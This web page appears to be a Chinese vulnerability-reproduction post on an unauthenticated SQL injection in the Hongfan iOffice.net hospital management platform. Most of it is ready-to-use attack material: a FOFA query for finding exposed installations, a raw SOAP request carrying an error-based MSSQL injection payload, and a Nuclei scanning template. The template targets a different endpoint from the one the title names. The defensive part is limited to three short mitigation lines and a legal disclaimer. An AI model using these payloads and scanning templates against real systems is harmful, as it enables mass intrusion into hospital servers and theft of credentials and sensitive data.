<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【漏洞复现】红帆iOffice.net wssRtSyn接口处存在SQL注入 - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/d15b70c0297bb320f3fd23632f51f71d/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="【漏洞复现】红帆iOffice.net wssRtSyn接口处存在SQL注入">
  <meta property="og:description" content="【产品&amp;&amp;漏洞简述】 红帆iOffice.net从最早满足医院行政办公需求（传统OA），到目前融合了卫生主管部门的管理规范和众多行业特色应用，是目前唯一定位于解决医院综合业务管理的软件，是最符合医院行业特点的医院综合业务管理平台，是成功案例最多的医院综合业务管理软件。
红帆iOffice.net wssRtSyn.asmx接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。
【资产测绘Query】 app=&#34;红帆-ioffice&#34; 【产品界面】 【poc】 POST /iOffice/prg/set/wss/wssRtSyn.asmx HTTP/1.1Host: your-ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36Content-Type: text/xmlAccept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: gzip,deflateConnection: Keep-alive&lt;?xml version=&#34;1.0&#34;?&gt;&lt;soap:Envelope xmlns:soap=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:tns=&#34;http://iOffice.net/iOffice/ioRtSyn&#34;&gt;&lt;soap:Header /&gt;&lt;soap:Body&gt;&lt;tns:SubmitLogInfo&gt;&lt;tns:data&gt;qwe&lt;/tns:data&gt;&lt;tns:ServerHost&gt;1&#39;&#43;(SELECT CHAR(103)&#43;CHAR(105)&#43;CHAR(75)&#43;CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)&#43;CHAR(118)&#43;CHAR(106)&#43;CHAR(122)&#43;CHAR(113)&#43;(SELECT @@version)&#43;CHAR(113)&#43;CHAR(118)&#43;CHAR(113)&#43;CHAR(120)&#43;CHAR(113))))&#43;&#39;&lt;/tns:ServerHost&gt;&lt;/tns:SubmitLogInfo&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 【Nuclei-Poc验证】 id: hongfan-iOffice-wssRtSyn-sqliinfo:name: 红帆iOffice.net wssRtSyn接口处存在SQL注入漏洞author: 王阿姨介绍的severity: criticaldescription: 红帆iOffice.net wssRtSyn接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。reference:metadata:verified: truemax-request: 1fofa-query: FOFA:app=&#34;红帆-ioffice&#34;tags: sqlirequests:- raw:- |POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1Host: {{Hostname}}User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-06-20T15:15:38+08:00">
    <meta property="article:modified_time" content="2024-06-20T15:15:38+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【漏洞复现】红帆iOffice.net wssRtSyn接口处存在SQL注入</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h3>【产品&amp;&amp;漏洞简述】</h3> 
<p>红帆iOffice.net从最早满足医院行政办公需求（传统OA），到目前融合了卫生主管部门的管理规范和众多行业特色应用，是目前唯一定位于解决医院综合业务管理的软件，是最符合医院行业特点的医院综合业务管理平台，是成功案例最多的医院综合业务管理软件。</p> 
<p>红帆iOffice.net wssRtSyn.asmx接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。</p> 
<h3><a name="%E3%80%90%E8%B5%84%E4%BA%A7%E6%B5%8B%E7%BB%98Query%E3%80%91"></a>【资产测绘Query】</h3> 
<pre></pre> 
<ol><li><code>app="红帆-ioffice"</code></li></ol> 
<p></p> 
<p class="img-center"><img alt="" height="421" src="https://images2.imgbox.com/19/09/6A6tOyWi_o.png" width="1200"></p> 
<h3><a name="%E3%80%90%E4%BA%A7%E5%93%81%E7%95%8C%E9%9D%A2%E3%80%91"></a>【产品界面】</h3> 
<p></p> 
<p class="img-center"><img alt="" height="775" src="https://images2.imgbox.com/9b/c2/OjVjfjxI_o.png" width="1200"></p> 
<h3><a name="%E3%80%90poc%E3%80%91"></a>【poc】</h3> 
<pre></pre> 
<ol><li><code>POST /iOffice/prg/set/wss/wssRtSyn.asmx HTTP/1.1</code></li><li><code>Host: your-ip</code></li><li><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</code></li><li><code>Content-Type: text/xml</code></li><li><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</code></li><li><code>Accept-Encoding: gzip,deflate</code></li><li><code>Connection: Keep-alive</code></li><li><li><code>&lt;?xml version="1.0"?&gt;</code></li><li><code>&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://iOffice.net/iOffice/ioRtSyn"&gt;</code></li><li><code>&lt;soap:Header /&gt;</code></li><li><code>&lt;soap:Body&gt;</code></li><li><code>&lt;tns:SubmitLogInfo&gt;</code></li><li><code>&lt;tns:data&gt;qwe&lt;/tns:data&gt;</code></li><li><code>&lt;tns:ServerHost&gt;1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT @@version)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'&lt;/tns:ServerHost&gt;</code></li><li><code>&lt;/tns:SubmitLogInfo&gt;</code></li><li><code>&lt;/soap:Body&gt;</code></li><li><code>&lt;/soap:Envelope&gt;</code></li></ol> 
<p></p> 
<p class="img-center"><img alt="" height="670" src="https://images2.imgbox.com/5b/a6/ikyiU4KU_o.png" width="1200"></p> 
<h3><a name="%E3%80%90Nuclei-Poc%E9%AA%8C%E8%AF%81%E3%80%91"></a>【Nuclei-Poc验证】</h3> 
<pre></pre> 
<ol><li><code>id: hongfan-iOffice-wssRtSyn-sqli</code></li><li><code>info:</code></li><li><code>name: 红帆iOffice.net wssRtSyn接口处存在SQL注入漏洞</code></li><li><code>author: 王阿姨介绍的</code></li><li><code>severity: critical</code></li><li><code>description: 红帆iOffice.net wssRtSyn接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。</code></li><li><code>reference:</code></li><li><code>metadata:</code></li><li><code>verified: true</code></li><li><code>max-request: 1</code></li><li><code>fofa-query: FOFA:app="红帆-ioffice"</code></li><li><code>tags: sqli</code></li><li><li><code>requests:</code></li><li><code>- raw:</code></li><li><code>- |</code></li><li><code>POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1</code></li><li><code>Host: {<!-- -->{Hostname}}</code></li><li><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</code></li><li><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</code></li><li><code>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</code></li><li><code>Accept-Encoding: gzip, deflate</code></li><li><code>Connection: close</code></li><li><code>Upgrade-Insecure-Requests: 1</code></li><li><code>SOAPAction: http://tempuri.org/GetDepSchedule</code></li><li><code>Content-Type: text/xml;charset=UTF-8</code></li><li><li><code>&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/"&gt;</code></li><li><code>&lt;soap:Header/&gt;</code></li><li><code>&lt;soap:Body&gt;</code></li><li><code>&lt;tem:GetDepSchedule&gt;</code></li><li><code>&lt;!--type: string--&gt;</code></li><li><code>&lt;tem:EmpLoginID&gt;1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT @@version)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'&lt;/tem:EmpLoginID&gt;</code></li><li><code>&lt;/tem:GetDepSchedule&gt;</code></li><li><code>&lt;/soap:Body&gt;</code></li><li><code>&lt;/soap:Envelope&gt;</code></li><li><li><code>matchers-condition: and</code></li><li><code>matchers:</code></li><li><code>- type: word</code></li><li><code>part: body</code></li><li><code>words:</code></li><li><code>- 'SQL Server'</code></li><li><code>- 'System'</code></li><li><code>condition: and</code></li><li><li><code>- type: status</code></li><li><code>status:</code></li><li><code>- 500</code></li></ol> 
<p></p> 
<p class="img-center"><img alt="" height="655" src="https://images2.imgbox.com/99/a4/U3Rpi4YL_o.png" width="1200"></p> 
<h3><a name="%E3%80%90%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE%E3%80%91"></a>【修复建议】</h3> 
<p>1、请联系厂商进行修复。<br> 2、如非必要，禁止公网访问该系统。<br> 3、设置白名单访问。</p> 
<p> 申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/a06cef463e4aea14313afba89ce99c31/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【C&#43;&#43;】类和对象（三）构造与析构</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/3742945994531a9a454ebb16acc03ce0/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Day15—热点搜索词统计</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>